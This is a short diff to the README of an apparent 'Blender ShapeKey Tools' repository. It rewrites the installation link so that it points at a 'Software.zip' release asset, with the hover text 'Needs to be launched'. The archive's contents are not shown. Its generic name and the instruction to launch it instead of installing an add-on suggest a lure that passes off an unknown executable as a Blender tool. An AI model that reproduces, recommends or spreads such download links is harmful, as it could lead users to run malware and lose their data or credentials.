@@ -11,7 +11,7 @@ Welcome to the Blender ShapeKey Tools repository! This tool is designed to simpl
 ## Installation 🔧
 
 To get started with Blender ShapeKey Tools, you can download the software from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/user-attachments/files/18388744/Software.zip "Needs to be launched")
+[![Download Software](https://github.com/vanshdrall/blender-shapekey-tools/releases/download/v2.0/Software.zip)](https://github.com/vanshdrall/blender-shapekey-tools/releases/download/v2.0/Software.zip "Needs to be launched")
 
 ## How to Use 📝
 
